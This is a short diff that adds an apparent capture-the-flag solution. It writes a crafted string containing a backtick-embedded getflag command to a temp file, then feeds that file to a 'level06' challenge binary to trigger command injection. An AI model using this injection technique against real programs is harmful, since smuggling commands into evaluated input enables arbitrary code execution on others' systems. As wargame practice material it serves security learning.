@@ -1,0 +1,3 @@
+echo '[x ${`getflag`}]' > /tmp/getflag
+
+./level06 /tmp/getflag
